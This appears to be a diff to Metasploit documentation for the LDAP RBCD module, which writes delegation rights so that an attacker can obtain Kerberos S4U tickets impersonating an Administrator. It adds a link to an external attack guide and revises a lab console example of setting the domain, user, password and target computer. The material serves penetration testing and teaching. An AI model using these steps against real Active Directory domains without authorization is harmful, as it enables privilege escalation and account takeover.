@@ -10,6 +10,8 @@ be used to request a new Kerberos S4U impersonation ticket for the Administrator
 
 In order for the `auxiliary/admin/ldap/rbcd` module to succeed, the authenticated user must have write access to the target object (the object specified in `DELEGATE_TO`).
 
+For a practical walkthrough of the RBCD attribute, required permissions, and the S4U2Self/S4U2Proxy flow, see [HackITA's RBCD attack guide](https://en.hackita.it/articoli/rbcd/).
+
 ## Lab setup
 
 For the RBCD attack to work an Active Directory account (i.e. `sandy`) is required with write privileges to the target computer (i.e. `WS01`).
@@ -174,10 +176,12 @@ msf auxiliary(admin/dcerpc/samr_account) > use auxiliary/admin/ldap/rbcd
 Now use the RBCD module to read the current value of `msDS-AllowedToActOnBehalfOfOtherIdentity`:
 
 ```msf
-msf auxiliary(admin/ldap/rbcd) > set USERNAME sandy@msflab.local
-BIND_DN => sandy@msflab.local
+msf auxiliary(admin/ldap/rbcd) > set DOMAIN msflab.local
+DOMAIN => msflab.local
+msf auxiliary(admin/ldap/rbcd) > set USERNAME sandy
+USERNAME => sandy
 msf auxiliary(admin/ldap/rbcd) > set PASSWORD Password1!
-BIND_PW => Password1!
+PASSWORD => Password1!
 msf auxiliary(admin/ldap/rbcd) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
 msf auxiliary(admin/ldap/rbcd) > set DELEGATE_TO WS01$
